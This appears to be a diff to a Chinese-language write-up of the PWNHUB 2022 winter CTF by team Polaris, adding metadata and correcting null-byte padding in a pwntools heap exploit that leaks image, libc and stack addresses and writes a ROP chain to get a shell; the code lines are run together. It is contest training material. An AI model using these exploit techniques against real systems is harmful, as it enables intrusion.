@@ -53,6 +53,9 @@ prerequisites:
 - Flask eval 与 Python 沙箱逃逸
 - MySQL 协议结构(认证包/COM_QUERY)
 - fmt-string 任意地址读写与 %hhn 单字节写
+contest_normalized: "PWNHUB"
+contest_year: 2022
+subcategory_guess: "ssrf"
 ---
 # PWNHUB 2022冬季赛Polaris战队–WP
 
@@ -136,9 +139,9 @@ bytes, **params): return self.pipe.sendline(data, **params) def recv(self, **par
  def sendlineafter(self, delim, data, **params): self.recvuntil(delim, **params) self.sendline(data, **params) def add(self, index, size, content): self.sendlineafter(b'> ', b'1') self.sendlineafter(b'> ', str(index).encode()) self.sendlineafter(b'Size: ', str(size).encode()) self.sendafter(b'Content: ', content) def edit(self, index, size, content): self.sendlineafter(b'> ', b'2') self.sendlineafter(b'> ', str(index).encode()) self.sendlineafter(b'Size: ', str(size).encode()) self.sendafter(b'Content: ', content) def delete(self, index): self.sendlineafter(b'> ', b'3') self.sendlineafter(b'> ', str(index).encode())
  def show(self, index): self.sendlineafter(b'> ', b'4') self.sendlineafter(b'> ', str(index).encode())
 sh = Shell()sh.add(0, 0x80, b'aa')
-sh.edit(16, 0x10, b'a' * 0x10)sh.show(16)sh.recvuntil(b'a' * 0x10)image_addr = u64(sh.recvn(6) + b'  ') - 0x40c0success('image_addr: ' + hex(image_addr))
-sh.edit(0, 8, p64(image_addr+0x3fe0))sh.show(0x390)libc_addr = u64(sh.recvn(6) + b'  ') - 0x17620success('libc_addr: ' + hex(libc_addr))
-sh.edit(0, 8, p64(libc_addr+0x9ade0))sh.show(0x390)stack_addr = u64(sh.recvn(6) + b'  ')success('stack_addr: ' + hex(stack_addr))
+sh.edit(16, 0x10, b'a' * 0x10)sh.show(16)sh.recvuntil(b'a' * 0x10)image_addr = u64(sh.recvn(6) + b'\\x00\\x00') - 0x40c0success('image_addr: ' + hex(image_addr))
+sh.edit(0, 8, p64(image_addr+0x3fe0))sh.show(0x390)libc_addr = u64(sh.recvn(6) + b'\\x00\\x00') - 0x17620success('libc_addr: ' + hex(libc_addr))
+sh.edit(0, 8, p64(libc_addr+0x9ade0))sh.show(0x390)stack_addr = u64(sh.recvn(6) + b'\\x00\\x00')success('stack_addr: ' + hex(stack_addr))
 sh.edit(0, 8, p64(stack_addr-0x90))
 sh.edit(0x390, 0x100, flat([libc_addr + 0x1551f, libc_addr + 0x95941, libc_addr + 0x43c7c]))
 sh.interactive()
@@ -373,9 +376,9 @@ bytes, **params): return self.pipe.sendline(data, **params) def recv(self, **par
  def sendlineafter(self, delim, data, **params): self.recvuntil(delim, **params) self.sendline(data, **params) def add(self, index, size, content): self.sendlineafter(b'> ', b'1') self.sendlineafter(b'> ', str(index).encode()) self.sendlineafter(b'Size: ', str(size).encode()) self.sendafter(b'Content: ', content) def edit(self, index, size, content): self.sendlineafter(b'> ', b'2') self.sendlineafter(b'> ', str(index).encode()) self.sendlineafter(b'Size: ', str(size).encode()) self.sendafter(b'Content: ', content) def delete(self, index): self.sendlineafter(b'> ', b'3') self.sendlineafter(b'> ', str(index).encode())
  def show(self, index): self.sendlineafter(b'> ', b'4') self.sendlineafter(b'> ', str(index).encode())
 sh = Shell()sh.add(0, 0x80, b'aa')
-sh.edit(16, 0x10, b'a' * 0x10)sh.show(16)sh.recvuntil(b'a' * 0x10)image_addr = u64(sh.recvn(6) + b'  ') - 0x40c0success('image_addr: ' + hex(image_addr))
-sh.edit(0, 8, p64(image_addr+0x3fe0))sh.show(0x390)libc_addr = u64(sh.recvn(6) + b'  ') - 0x17620success('libc_addr: ' + hex(libc_addr))
-sh.edit(0, 8, p64(libc_addr+0x9ade0))sh.show(0x390)stack_addr = u64(sh.recvn(6) + b'  ')success('stack_addr: ' + hex(stack_addr))
+sh.edit(16, 0x10, b'a' * 0x10)sh.show(16)sh.recvuntil(b'a' * 0x10)image_addr = u64(sh.recvn(6) + b'\\x00\\x00') - 0x40c0success('image_addr: ' + hex(image_addr))
+sh.edit(0, 8, p64(image_addr+0x3fe0))sh.show(0x390)libc_addr = u64(sh.recvn(6) + b'\\x00\\x00') - 0x17620success('libc_addr: ' + hex(libc_addr))
+sh.edit(0, 8, p64(libc_addr+0x9ade0))sh.show(0x390)stack_addr = u64(sh.recvn(6) + b'\\x00\\x00')success('stack_addr: ' + hex(stack_addr))
 sh.edit(0, 8, p64(stack_addr-0x90))
 sh.edit(0x390, 0x100, flat([libc_addr + 0x1551f, libc_addr + 0x95941, libc_addr + 0x43c7c]))
 sh.interactive()
